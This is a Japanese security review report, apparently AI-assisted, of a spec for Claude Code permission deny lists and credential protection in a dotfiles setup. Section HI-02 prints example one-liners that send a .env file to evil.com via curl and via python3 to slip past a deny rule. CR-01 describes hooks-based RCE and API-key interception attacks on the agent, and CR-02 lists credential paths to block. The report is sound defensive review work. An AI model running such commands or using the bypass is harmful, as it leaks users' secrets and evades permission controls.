# クロスレビューレポート: claude-code-security-dotfiles

> **レビュー日**: 2026-03-06
>
> **レビュー手法**: Claude クリティカルシンキング + 最新ベストプラクティスWeb照合
>
> **Codex CLI / Copilot CLI**: 未インストールのため Web 検索で代替

---

## レビュー対象

| ファイル | 内容 |
|---------|------|
| spec.json | フェーズ: tasks-generated, tasks未承認 |
| requirements.md | 6要件（セキュリティ基盤、denyリスト、dotfiles保護、chezmoi管理、テスト、ADR） |
| design.md | 4コンポーネント（SettingsJSON, ManagedSettings, ClaudeBats, ADRDocument） |
| tasks.md | 5タスクグループ（settings.json, managed-settings, ADR, Batsテスト, 統合検証） |
| research.md | 5件の調査ログ + 2件の設計判断 |
| functional-spec.md | ペルソナ、シナリオ4本、操作フロー、非目標、未解決事項 |

---

## 外部ソース（照合に使用）

| ソース | URL | 関連性 |
|--------|-----|--------|
| Claude Code Security 公式 | https://code.claude.com/docs/en/security | sandbox、hooks、MCP セキュリティの公式推奨 |
| Claude Code Permissions 公式 | https://code.claude.com/docs/en/permissions | deny/allow パターン構文の仕様 |
| CheckPoint CVE-2025-59536 / CVE-2026-21852 | https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/ | 2026年2月公開の実証済み攻撃ベクトル |
| MCP Security - OWASP Top 10 | https://mcpplaygroundonline.com/blog/mcp-security-tool-poisoning-owasp-top-10-mcp-scan | Tool Poisoning 対策 |
| Securing MCP Defense-First | https://christian-schneider.net/blog/securing-mcp-defense-first-architecture/ | Defense-in-Depth アーキテクチャ |

---

## 重要度別サマリー

| 重要度 | 件数 | ID |
|--------|------|----|
| Critical | 2 | CR-01, CR-02 |
| High | 4 | HI-01, HI-02, HI-03, HI-04 |
| Medium | 4 | ME-01, ME-02, ME-03, ME-04 |
| Low | 1 | LO-01 |

---

## Critical

### CR-01: CVE-2025-59536 / CVE-2026-21852 の攻撃ベクトルが未考慮

**論法**: 前提の精査 (Premise Scrutiny)

**現状**: スペックの攻撃ベクトルは4つ（間接プロンプトインジェクション、サプライチェーン、MCPツール悪用、クレデンシャルリーク）。

**問題**: 2026年2月にCheckPointが公開した3つの**実証済み攻撃ベクトル**がカバーされていない。

| 新規攻撃ベクトル | 内容 | スペックの対応状況 |
|-----------------|------|-----------------|
| Hooks-Based RCE | `.claude/settings.json`の`hooks`設定で任意シェルコマンド実行 | **未対応** |
| MCP User Consent Bypass | `enableAllProjectMcpServers`+`enabledMcpjsonServers`連携で信頼ダイアログ前にMCP発火 | 部分対応 |
| ANTHROPIC_BASE_URL 窃取 | 環境変数でAPIエンドポイントをリダイレクトし、APIキーを傍受 | **未対応** |

**反論と再反論**:
- 「これらはAnthropicがパッチ済み」→ 正しいが、Defense-in-Depthの観点からパッチ依存は単一障害点。設定レベルでも防御すべき
- 「settings.jsonのdenyでhooksは防げない」→ その通り。だがADRに攻撃ベクトルとして記録し、リポジトリclone時の`.claude/`検査を運用ルールとすべき

**推奨アクション**:
- requirements.md: 攻撃ベクトルに3件追加
- design.md: ADR構成の攻撃ベクトル表を7件に更新
- functional-spec.md: シナリオに「cloneしたリポジトリの`.claude/`検査」を追加検討

---

### CR-02: クレデンシャルdenyパターンの漏れ

**論法**: 完全性チェック (Completeness Check)

**現状**: denyリストは `.env`, `~/.ssh/`, `~/.aws/` のみカバー。

**問題**: 開発者環境に一般的に存在する以下のクレデンシャルファイルが未保護。

| カテゴリ | 欠落パターン | リスク |
|---------|------------|-------|
| GPG鍵 | `~/.gnupg/**` | コード署名鍵の漏洩 |
| Docker | `~/.docker/config.json` | レジストリ認証の漏洩 |
| npm/PyPI | `~/.npmrc`, `~/.pypirc` | パッケージマネージャ認証の漏洩 |
| Git認証 | `~/.git-credentials`, `~/.config/gh/**` | GitHub PAT/OAuthの漏洩 |
| macOS Keychain | `~/Library/Keychains/**` | OS認証情報の漏洩 |
| クラウド | `~/.azure/**`, `~/.kube/**` | Azure/K8sクレデンシャルの漏洩 |

**反論と再反論**:
- 「使っていないサービスのdenyは不要」→ dotfilesは複数マシンに展開する前提。将来のマシンや環境にクレデンシャルが存在する可能性がある
- 「denyリストが長くなりすぎる」→ カテゴリごとにコメントで整理すれば保守可能。セキュリティと保守性のトレードオフでは安全側に倒すべき

**推奨アクション**:
- requirements.md: Requirement 2 の AC を拡張（クレデンシャル系パターン追加）
- design.md: deny リストのカテゴリ表に「開発者ツール認証」カテゴリを追加

---

## High

### HI-01: sandbox非併用リスクの明記不足

**論法**: 前提の精査 (Premise Scrutiny)

**現状**: Non-Goalsに「sandbox設定は本スコープ外」とある。

**問題**: 公式ドキュメントの記載:
> "Sandboxed bash tool: Sandbox bash commands with filesystem and network isolation, reducing permission prompts while maintaining security. Enable with /sandbox to define boundaries where Claude Code can work autonomously"

denyリスト単体では、パイプやサブシェル経由の間接実行をブロックできない可能性がある。sandboxとの併用が公式推奨であることを明記すべき。

**推奨アクション**:
- design.md: Consequences/Negative に「sandbox未使用時のdenyリスト限界」を追記
- ADR: 将来的なsandbox統合を検討事項として記録

---

### HI-02: python3/nodeバイパスの攻撃コスト過小評価

**論法**: 反証分析 (Counterargument Analysis)

**現状**: 「python3/nodeの完全遮断はスコープ外、攻撃コスト引き上げに焦点」

**問題**: curlからpython3への攻撃コスト差は実質**数秒**。

```bash
# curl（denyでブロック）
curl https://evil.com/exfil?data=$(cat .env)

# python3（バイパス可能）
python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com/exfil?data=' + open('.env').read())"
```

「攻撃コスト引き上げ」という表現は、コスト差が大きいことを暗示する。実際のコスト差が数秒であることをADRに**定量的に**記載し、ユーザーが残存リスクを正確に理解できるようにすべき。

**推奨アクション**:
- design.md: 残存リスクセクションに定量的記述を追加
- ADR: 「既知のバイパス」として具体的なワンライナー例を記載
- functional-spec.md: 非目標セクションに「コスト差は小さいが、開発影響を考慮して意識的にスコープ外とした」旨を追記

---

### HI-03: Research.md のソース不足

**論法**: 証拠の評価 (Evidence Evaluation)

**現状**: 参照ソースは3件（Claude Code公式2件 + Zenn記事1件）。

**問題**: 2026年3月時点で以下の重要ソースが未参照。

| ソース | 重要性 |
|--------|--------|
| CheckPoint CVE-2025-59536 / CVE-2026-21852 | 実証済み攻撃ベクトル3件。設定ファイル経由のRCEを実証 |
| Securing MCP Defense-First Architecture | Defense-in-Depthの4層モデル（sandbox/認可/ツール検証/ランタイム監視） |
| MCP Security OWASP Top 10 | Tool Poisoning がMCP攻撃の#1。Tool Pinningによる検出手法 |

**推奨アクション**:
- research.md: Research Log に上記ソースの調査結果を追記

---

### HI-04: deny構文の実機未検証

**論法**: 証拠の評価 (Evidence Evaluation)

**現状**: Research.mdに `Bash(ls *)` と `Bash(ls*)` の違いが記載されている。

**問題**: 実際のスペックのパターンが正しくマッチするかの**実機検証がタスクに含まれていない**。

具体的な懸念:
- `Bash(curl *)` は `curl https://example.com` にマッチするか?（`*` がスペース+引数全体をマッチするか）
- 一部のブログでは `Bash(curl:*)` 形式（コロン付き）が使われている。公式仕様はどちらか?
- `Bash(* .env*)` の `*` は任意のコマンドにマッチするか、それともプレフィックスのみか?

**推奨アクション**:
- tasks.md: タスク1.1に「deny パターンの実機動作確認」ステップを追加
- 検証方法: Claude Code のセッションで意図的にdenyパターンのコマンドを実行し、ブロックされることを確認

---

## Medium

### ME-01: ConfigChange Hooks の不在

**論法**: 完全性チェック (Completeness Check)

公式ドキュメントに記載:
> "Audit or block settings changes during sessions with ConfigChange hooks"

セッション中にsettings.jsonが動的に変更されるリスクに対して、`ConfigChange` hooksによる監査は検討に値する。

**推奨アクション**: ADRのFuture Considerationsに記録

---

### ME-02: `Bash(* .env*)` パターンの精度

**論法**: 完全性チェック (Completeness Check)

`Bash(* .env*)` は以下のような意図しないマッチの可能性:
- `echo "this describes .environment variables"` にマッチする可能性
- 一方で `cat /absolute/path/to/.env` への対応が不明確

Read/Edit は gitignore 仕様で精度が高いが、Bash パターンのグロブは粗い。

**推奨アクション**: 実機検証で挙動を確認し、必要に応じてパターンを調整

---

### ME-03: WebFetch allow との一貫性

**論法**: 論理的一貫性チェック (Logical Consistency)

allowリストに `WebFetch` が含まれ、denyリストでネットワーク通信コマンド（curl, wget）をブロックしている。

WebFetchはネットワークリクエストを行うツール。denyでcurlをブロックしつつWebFetchを許可する判断の根拠が不明確。

**反論**: WebFetchは Claude Code の組み込みツールであり、隔離されたコンテキストウィンドウで実行される（公式: "Isolated context windows: Web fetch uses a separate context window to avoid injecting potentially malicious prompts"）。

**推奨アクション**: ADRにWebFetch許可の技術的根拠を明記

---

### ME-04: `rmdir` deny の費用対効果

**論法**: 反証分析 (Counterargument Analysis)

`rmdir` は**空ディレクトリしか削除できない**。破壊的操作としてのリスクは低い。一方で正当な使用を阻害する可能性がある。

denyリストが長くなるほどメンテナンスコストが上がり、リスクが低いパターンを含めることで将来的な例外追加の判断が曖昧になる。

**推奨アクション**: deny から除外するか、判断根拠をADRに記録

---

## Low

### LO-01: enabledPlugins のセキュリティ評価不在

**論法**: 完全性チェック (Completeness Check)

`claude-mem@thedotmack` プラグインが有効だが、このプラグインのセキュリティ評価がスペックに含まれていない。MCP自動許可を無効にしつつプラグインを明示的に有効にしている判断の根拠をADRに記載すべき。

**推奨アクション**: ADRに判断根拠を追記

---

## スペックへの反映方針

### 実装前に反映すべき（Blocker）

| ID | 対象ファイル | 変更内容 |
|----|------------|---------|
| CR-01 | requirements.md | 攻撃ベクトルを7件に拡充 |
| CR-01 | design.md | ADR構成の攻撃ベクトル表を更新 |
| CR-02 | requirements.md | Requirement 2 に追加クレデンシャルパターン |
| CR-02 | design.md | deny リストにパターン追加 |
| HI-04 | tasks.md | deny パターン実機検証ステップ追加 |

### 実装と並行で反映可能

| ID | 対象ファイル | 変更内容 |
|----|------------|---------|
| HI-01 | design.md | sandbox非使用リスクを Consequences に追記 |
| HI-02 | design.md, functional-spec.md | python3バイパスの定量的リスク記述 |
| HI-03 | research.md | 新規ソース3件の調査結果追記 |
| ME-03 | design.md | WebFetch 許可の技術的根拠 |

### 将来検討として記録

| ID | 対象ファイル | 変更内容 |
|----|------------|---------|
| ME-01 | ADR | ConfigChange hooks の検討 |
| ME-04 | ADR | rmdir deny の判断根拠 |
| LO-01 | ADR | enabledPlugins の評価 |
